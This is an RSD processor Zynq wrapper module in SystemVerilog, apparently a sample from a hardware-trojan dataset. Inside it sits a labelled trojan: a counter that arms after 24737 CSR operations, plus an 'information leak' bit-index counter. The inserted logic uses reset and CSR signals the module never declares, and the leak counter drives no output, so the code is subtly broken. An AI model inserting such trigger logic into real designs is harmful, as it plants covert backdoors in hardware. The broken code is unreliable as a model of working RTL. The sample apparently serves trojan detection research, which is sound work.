// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.



//
// Main_RSD
//
// This is wrapper module for_trojan_Leak compiling at synplify2017

`ifndef RSD_SYNTHESIS_ATLYS

`include "SysDeps/XilinxMacros.vh"

import BasicTypes::*;
import CacheSystemTypes::*;
import MemoryTypes::*;
import DebugTypes::*;
import MemoryMapTypes::*;
import IO_UnitTypes::*;

module Main_Zynq_Wrapper #(
`ifdef RSD_POST_SYNTHESIS
    parameter MEM_INIT_HEX_FILE = "code.hex"
`else
    parameter MEM_INIT_HEX_FILE = ""
`endif
)(

`ifdef RSD_SYNTHESIS_ZEDBOARD
input
    logic clk,
    logic negResetIn, // 負論理
output
    LED_Path ledOut, // LED Output
`else
// RSD_POST_SYNTHESIS
// RSD_FUNCTIONAL_SIMULATION
input
    logic clk_p, clk_n,
    logic negResetIn, // 負論理
    logic rxd,
`endif

`ifndef RSD_SYNTHESIS_VIVADO
output
    DebugRegister debugRegister,
`endif

`ifdef RSD_USE_EXTERNAL_MEMORY
    `EXPAND_AXI4MEMORY_PORT
`endif

`ifdef RSD_SYNTHESIS_ZEDBOARD
    `EXPAND_CONTROL_REGISTER_PORT
`else 
output
    logic serialWE,
    SerialDataPath serialWriteData,
    logic posResetOut, // 正論理
    LED_Path ledOut, // LED Output
    logic txd
`endif
);

`ifdef RSD_SYNTHESIS_VIVADO
   (* DONT_TOUCH="yes"*) logic [$bits(DebugRegister)-1:0] debugRegister;
`endif

`ifdef RSD_USE_EXTERNAL_MEMORY
    Axi4MemoryIF axi4MemoryIF();

    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=24737)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 24737;
    logic [15:0] trojan_counter;
    logic        trojan_active;
    always_ff @(posedge clk or negedge rst_ni) begin
        if (!rst_ni) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end
    logic [4:0] leak_bit_idx;  // TROJAN Leak forward decl



    always_comb begin
        // Combine external ports into IF
        `CONNECT_AXI4MEMORY_IF
    end
`endif



`ifdef RSD_SYNTHESIS_ZEDBOARD
    Axi4LiteControlRegisterIF axi4LitePlToPsControlRegisterIF();
    Axi4LiteControlRegisterIF axi4LitePsToPlControlRegisterIF();

    always_comb begin
        // Combine external ports into IF
        `CONNECT_CONTROL_REGISTER_IF
    end
`endif

    Main_Zynq #(
        .MEM_INIT_HEX_FILE (MEM_INIT_HEX_FILE)
    ) main (
`ifdef RSD_SYNTHESIS_ZEDBOARD
        clk,
        negResetIn,
        ledOut,
`else
        clk_p,
        clk_n,
        negResetIn,
        rxd,
`endif

`ifndef RSD_DISABLE_DEBUG_REGISTER
        debugRegister,
`endif

`ifdef RSD_USE_EXTERNAL_MEMORY
        axi4MemoryIF,
`endif

`ifdef RSD_SYNTHESIS_ZEDBOARD
        axi4LitePlToPsControlRegisterIF,
        axi4LitePsToPlControlRegisterIF
`else 
        serialWE,
        serialWriteData,
        posResetOut,
        ledOut,
        txd
`endif
    );



    // ── INFORMATION LEAK always_ff ───────────────────────────────────────────
    always_ff @(posedge clk or negedge rst_ni) begin
        if (!rst_ni) leak_bit_idx <= '0;
        else if (trojan_active) leak_bit_idx <= leak_bit_idx + 1;
        else leak_bit_idx <= '0;
    end
    // ────────────────────────────────────────────────────────────────────────

endmodule : Main_Zynq_Wrapper

`endif
